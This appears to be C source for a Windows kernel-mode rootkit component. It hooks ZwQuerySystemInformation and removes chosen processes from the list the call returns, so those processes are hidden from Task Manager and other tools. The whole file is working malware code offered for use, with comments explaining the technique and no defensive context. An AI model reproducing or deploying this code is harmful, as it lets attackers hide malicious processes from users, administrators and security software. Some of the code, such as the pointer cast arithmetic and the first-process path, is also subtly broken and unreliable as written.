#include <ntddk.h>
#include "process.h"

typedef unsigned char BYTE, *PBYTE;

WCHAR *ProcessToHide[128];
ULONG NbProcessToHide=0;

/*
       This is a hook of ZwQuerySystemInformation using Direct Kernel Object 
       Manipulation (DKOM), presented for the first time by Jamie Buffer, to 
       Blackhat 2004, in USA.
       
       The principle is simple here, process's are in fact here nothing else that
       a chained list, we just have to track down the process to be hidden and 
       to connect directly the previous process and the following one.
       It don't affects (fortunately for us) not the execution of this process, 
       which Windows manages otherwise.
*/

ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformationAddress = NULL;   

LONGLONG UserTime=0, KernelTime=0;

NTSTATUS ZwQuerySystemInformationHook(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength)
{

   NTSTATUS status;
   PSYSTEM_PROCESS_INFORMATION curr;
   PSYSTEM_PROCESS_INFORMATION prev;
   ULONG i;

   status = ((ZWQUERYSYSTEMINFORMATION)(ZwQuerySystemInformationAddress)) (
					SystemInformationClass,
					SystemInformation,
					SystemInformationLength,
					ReturnLength );

   if( !NT_SUCCESS(status) ) 
      return status;
   
   if(SystemInformationClass!=5) // not a process request
      return status;       
   
   for(i=0; i<NbProcessToHide; i++) {
      
      curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
      prev = NULL;
            	 
      while(curr) {
         //DbgPrint("Current item is %x\n", curr);
         if (curr->ProcessName.Buffer != NULL) {   
                                   
            if( curr->ProcessName.Length == wcslen(ProcessToHide[i])*2 &&
                !memcmp(curr->ProcessName.Buffer,ProcessToHide[i], curr->ProcessName.Length)) 
            {                                                                       
            
               if(!prev) {
                  // we are first process     
                  if(curr->NextEntryDelta) // if there is a process after it
                     // first process becomes this one
			         (PBYTE)SystemInformation += curr->NextEntryDelta;
			      else 
                     // no process ! >_>
                     SystemInformation = NULL;
			   }
			   else {
                  // there was a process before
			      if(curr->NextEntryDelta) // if there is a process after
			         // previous process leads to next 
			         prev->NextEntryDelta += curr->NextEntryDelta;
			      else	
			         // previous process is the last one =)
			         prev->NextEntryDelta = 0;    
			   }	
            } 
            else
               // not a process to hide, prev ptr go to this process
               prev = curr;  
         }

         // curr go to next process
         if(curr->NextEntryDelta) 
            ((PBYTE)curr += curr->NextEntryDelta);
         else 
             curr = NULL;
      }
   }
   
   return status;
}

